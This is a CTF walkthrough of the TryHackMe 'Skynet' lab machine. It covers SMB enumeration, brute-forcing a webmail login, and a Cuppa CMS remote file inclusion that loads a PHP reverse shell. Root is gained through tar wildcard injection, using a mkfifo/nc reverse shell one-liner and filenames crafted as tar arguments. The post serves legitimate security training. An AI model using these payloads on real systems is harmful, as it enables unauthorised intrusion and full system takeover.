---
title: "TryHackMe - Skynet"
date: 2025-06-16 12:00:00 +0000
author: scr4tcher
categories: [TryHackMe CTF]
tags: [bash, reverse shell, RFI, SMB, SMB enumeration, webmail, CMS, SMBmap, tar, cron, samba, cuppa ]
---

Hasta la vista, baby.

Are you able to compromise this Terminator themed machine?


## Reconnaissance

As always, I begin with an **Nmap** scan to gather information about the target system. I use a full TCP port scan with default scripts and service version detection:


```console
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap  -T4 -sV -sC -p- 10.10.64.70 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-16 06:37 EDT
Nmap scan report for 10.10.64.70
Host is up (0.077s latency).
Not shown: 65529 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: SASL CAPA AUTH-RESP-CODE RESP-CODES PIPELINING TOP UIDL
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: LITERAL+ more LOGINDISABLEDA0001 Pre-login have IDLE listed capabilities IMAP4rev1 SASL-IR ID post-login LOGIN-REFERRALS OK ENABLE
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: -1s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-06-16T10:38:44
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2025-06-16T05:38:44-05:00

```
The scan revealed several open ports:

- 22: OpenSSH 7.2p2

- 80: Apache HTTP Server 2.4.18

- 110 & 143: Dovecot POP3 and IMAP services

- 139 & 445: SMB (Samba) services

- Service Hostname: SKYNET

This indicates a Linux-based server with Samba, mail services, and a web server.

## Web Enumeration

To explore potential hidden paths on the web server, I used **Gobuster** with a common wordlist:

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ gobuster dir -u http://10.10.64.70 -w /usr/share/wordlists/dirb/common.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.64.70
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/admin                (Status: 301) [Size: 310] [--> http://10.10.64.70/admin/]
/config               (Status: 301) [Size: 311] [--> http://10.10.64.70/config/]
/css                  (Status: 301) [Size: 308] [--> http://10.10.64.70/css/]
/index.html           (Status: 200) [Size: 523]
/js                   (Status: 301) [Size: 307] [--> http://10.10.64.70/js/]
/server-status        (Status: 403) [Size: 276]
/squirrelmail         (Status: 301) [Size: 317] [--> http://10.10.64.70/squirrelmail/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```


Interesting results:

- /admin

- /config

- /squirrelmail – a webmail client

- Standard directories like /css, /js, and /index.html

I decided to visit `/squirrelmail`, which brought up a login page for webmail:

![1](/images/skynet/1.jpg)

## SMB Enumeration

Given that SMB ports were open, I ran **enum4linux** to enumerate users and shares:

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ enum4linux -U -o 10.10.64.70 
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jun 16 06:49:05 2025

 =========================================( Target Information )=========================================                                                                   
                                                                                      
Target ........... 10.10.64.70                                                        
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.64.70 )============================                                                                    
                                                                                      
                                                                                      
[+] Got domain/workgroup name: WORKGROUP                                              
                                                                                      
                                                                                      
 ====================================( Session Check on 10.10.64.70 )====================================                                                                   
                                                                                      
                                                                                      
[+] Server 10.10.64.70 allows sessions using username '', password ''                 
                                                                                      
                                                                                      
 =================================( Getting domain SID for 10.10.64.70 )=================================                                                                   
                                                                                      
Domain Name: WORKGROUP                                                                
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                  
                                                                                      
                                                                                      
 ===================================( OS information on 10.10.64.70 )===================================                                                                    
                                                                                      
                                                                                      
[E] Can't get OS info with smbclient                                                  
                                                                                      
                                                                                      
[+] Got OS info for 10.10.64.70 from srvinfo:                                         
        SKYNET         Wk Sv PrQ Unx NT SNT skynet server (Samba, Ubuntu)             
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 ========================================( Users on 10.10.64.70 )========================================                                                                   
                                                                                      
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: milesdyson       Name:   Desc:         

user:[milesdyson] rid:[0x3e8]
enum4linux complete on Mon Jun 16 06:49:10 2025

```

This revealed a single user:
`milesdyson`

To investigate further, I scanned available shares using **smbmap**:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ smbmap -H 10.10.64.70                                                    

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\] Checking for open ports...                                                        [|] Checking for open ports...                                                        [*] Detected 1 hosts serving SMB            
[/] Initializing hosts...                                                             [-] Authenticating...                                                                 [\] Authenticating...                                                                 [|] Authenticating...                                                                 [/] Authenticating...                                                                 [-] Authenticating...                                                                 [\] Authenticating...                                                                 [*] Established 1 SMB connections(s) and 0 authenticated session(s)
[|] Enumerating shares...                                                             [/] Enumerating shares...                                                             [-] Enumerating shares...                                                             [\] Enumerating shares...                                                             [|] Enumerating shares...                                                             [/] Enumerating shares...                                                             [-] Enumerating shares...                                                             [\] Enumerating shares...                                                             [|] Enumerating shares...                                                             [/] Enumerating shares...                                                             [-] Enumerating shares...                                                             [\] Enumerating shares...                                                             [|] Enumerating shares...                                                             [/] Enumerating shares...                                                             [-] Enumerating shares...                                                             [\] Enumerating shares...                                                             [|] Enumerating shares...                                                             [/] Enumerating shares...                                                             [-] Enumerating shares...                                                             [\] Enumerating shares...                                                             [|] Enumerating shares...                                                                                                                                                                 
[+] IP: 10.10.64.70:445 Name: 10.10.64.70               Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        anonymous                                               READ ONLY       Skynet Anonymous Share
        milesdyson                                              NO ACCESS       Miles Dyson Personal Share
        IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))
[/] Closing connections..                                                             [-] Closing connections..                                                                                                                                                   [*] Closed 1 connections
```
I found a readable share: `anonymous`.


## Accessing the Anonymous SMB Share

I connected using `smbclient` without a password:

 ```
   smbclient //10.10.64.70/anonymous -N 
 ```         

```
┌──(kali㉿kali)-[~/Desktop]
└─$ smbclient //10.10.64.70/anonymous -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 11:04:00 2020
  ..                                  D        0  Tue Sep 17 03:20:17 2019
  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
  logs                                D        0  Wed Sep 18 00:42:16 2019

                9204224 blocks of size 1024. 5831044 blocks available
smb: \> get attention.txt
getting file \attention.txt of size 163 as attention.txt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
smb: \> get logs
NT_STATUS_FILE_IS_A_DIRECTORY opening remote file \logs
smb: \> cd logs
smb: \logs\> ls
  .                                   D        0  Wed Sep 18 00:42:16 2019
  ..                                  D        0  Thu Nov 26 11:04:00 2020
  log2.txt                            N        0  Wed Sep 18 00:42:13 2019
  log1.txt                            N      471  Wed Sep 18 00:41:59 2019
  log3.txt                            N        0  Wed Sep 18 00:42:16 2019

                9204224 blocks of size 1024. 5831044 blocks available
smb: \logs\> get log1.txt
getting file \logs\log1.txt of size 471 as log1.txt (1.9 KiloBytes/sec) (average 1.3 KiloBytes/sec)
smb: \logs\> get log2.txt
getting file \logs\log2.txt of size 0 as log2.txt (0.0 KiloBytes/sec) (average 0.9 KiloBytes/sec)
smb: \logs\> get log3.txt
getting file \logs\log3.txt of size 0 as log3.txt (0.0 KiloBytes/sec) (average 0.7 KiloBytes/sec)
smb: \logs\> 
```

Inside, I found a few interesting files:

- `attention.txt` – which mentioned a recent password reset.

- logs/ – a folder containing three files: `log1.txt`, `log2.txt`, and `log3.txt`

The most useful file was `log1.txt`, which looked like a list of possible passwords:

```
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator

```
Looks like a brute-force opportunity.

## Brute-Forcing Webmail Login

With the username `milesdyson` and potential passwords from `log1.txt`, I set up **Burp Suite Intruder** to brute-force the **SquirrelMail** login page.

![2](/images/skynet/2.jpg)

Eventually, one of the passwords worked:

```
Username: milesdyson
Password: cyborg007haloterminator
```

## Reading the Webmail

Once logged in, I found an email that caught my eye:

```
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

Perfect. 

Time to access **Miles Dyson’s personal SMB** share.

## Accessing Miles Dyson's Share

Using the new credentials, I connected:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ smbclient //10.10.64.70/milesdyson -U milesdyson 
```


I discovered a file called `important.txt`:

```
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife

```

That path `/45kra24zxs28v3yd` looked like a hidden web directory. 

## Exploring the Beta CMS

I visited http://10.10.64.70/45kra24zxs28v3yd/ which brought up a personal-looking web page:

![3](/images/skynet/3.jpg)

Although nothing stood out immediately, I suspected there could be hidden paths or admin panels. So I fired up **Gobuster** again:

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ gobuster dir -u http://10.10.64.70/45kra24zxs28v3yd -w /usr/share/wordlists/dirb/common.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.64.70/45kra24zxs28v3yd
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/administrator        (Status: 301) [Size: 335] [--> http://10.10.64.70/45kra24zxs28v3yd/administrator/]                                                                                                    
/index.html           (Status: 200) [Size: 418]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

This revealed a hidden `/admin` based on **Cuppa CMS** directory under the personal path.I tried to reuse the email password (cyborg007haloterminator) for the admin panel login but it's don't work.

![](/images/skynet/4.jpg)

I ran **searchsploit** to check for any known exploits related to the system.

```console
┌──(kali㉿kali)-[~/Desktop]
└─$ searchsploit cuppa                              
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion     | php/webapps/25971.txt
-------------------------------------------------------------------- ---------------------------------
```

I copied the exploit locally:

```bash
searchsploit -m 25971
```

Following the PoC instructions, I hosted a **PentestMonkey PHP reverse shell** generated from [revshells.com](https://www.revshells.com) on my attacking machine:

```console
python -m http.server 8080
```

I also set up a listener:

```
nc -lvnp 1337
```

Then I triggered the **RFI vulnerability**:

```
http://10.10.64.70/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.23.106.242:8080/shell.php

```

Reverse shell caught. To upgrade the shell to an interactive TTY:

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

Next, I navigated to the home directory for user's flag.

```console
www-data@skynet:/$ cd /home
cd /home
www-data@skynet:/home$ ls
ls
milesdyson
www-data@skynet:/home$ cd milesdyson
cd milesdyson
www-data@skynet:/home/milesdyson$ ls
ls
backups  mail  share  user.txt
www-data@skynet:/home/milesdyson$ cat user.txt
cat user.txt
7ce5c2109a40f958099283600a9ae807
www-data@skynet:/home/milesdyson$ 
```


## Root flag

After gaining an initial foothold on the target machine, it was time to escalate privileges. The box's creator dropped a subtle hint: `"A recursive call."` That told me I’d need to dig deeper, likely through automated tasks or scripts.

To begin the enumeration, I uploaded `linpeas.sh` — a powerful script that helps identify privilege escalation paths on Linux systems. Here's how I did it:

```console

www-data@skynet:/tmp$ wget http://10.23.106.242:8080/linpeas.sh
wget http://10.23.106.242:8080/linpeas.sh
--2025-06-16 07:08:30--  http://10.23.106.242:8080/linpeas.sh
Connecting to 10.23.106.242:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 840082 (820K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 820.39K   809KB/s    in 1.0s    

2025-06-16 07:08:31 (809 KB/s) - 'linpeas.sh' saved [840082/840082]

www-data@skynet:/tmp$ ./linpeas.sh
./linpeas.sh
bash: ./linpeas.sh: Permission denied
www-data@skynet:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
www-data@skynet:/tmp$ 
```

Initially, I encountered a `“Permission denied”` error when trying to execute the script. This was quickly resolved by adding execute permissions with `chmod +x`.

During the scan, I noticed a key cronjob:

```console
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

This line means that every minute, the system executes `/home/milesdyson/backups/backup.sh` as the **root** user. I immediately inspected the contents of that script:

```console
cat backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

This script changes to the `/var/www/html` directory and creates a tar archive from its contents. Since it's being run as **root** and is using **tar**, a well-known opportunity for exploitation came to mind.

When tar is run as root and processes filenames controlled by an unprivileged user, it's possible to exploit it using a known `--checkpoint-action `technique to execute arbitrary commands.

### **Here’s the step-by-step exploit process I followed**:

#### Navigate to the writable directory `/var/www/html`.
> I went to the directory from which the cronjob operates:

####  Create a reverse shell payload
 > I wrote a reverse shell script that would connect back to my machine. I replaced `MY_IP` with the IP address of my kali machine

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc MY_IP 4444 >/tmp/f" > shell.sh
```

####  Craft the malicious tar options
> I created two dummy files that tar would interpret as arguments

```bash
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"
```
> These special filenames abuse tar’s command-line argument parsing. When the cronjob runs, tar will hit the checkpoint and execute the shell script as root.

####  Start a listener on my machine

```bash
nc -nvlp 4444
```

#### Wait for the shell
> Within a minute, the cronjob executed the malicious tar command, and I received a root shell on my listener


<br>With root access, grabbing the flag was straightforward:</br>

```console
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
3f0372db24753accc7179a282cd6a949
# 

```